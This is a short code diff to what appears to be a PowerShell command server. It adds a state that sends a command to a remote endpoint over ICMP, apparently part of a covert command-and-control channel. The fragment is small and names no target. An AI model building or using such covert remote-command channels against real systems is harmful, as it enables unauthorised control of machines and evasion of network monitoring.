@@ -202,6 +202,10 @@ public static class LIBC
 						$State = [ServerState]::WaitingForPrompt;
 						Break;
 					}
+					NeedsInstruction {
+						Send-ICMPMessage -ICMPHeader $ICMPHeader -Endpoint $Endpoint -MessageType IssuingCommand -Command $CommandToSend;
+						Break;
+					}
 				}
 				Break;
 			}
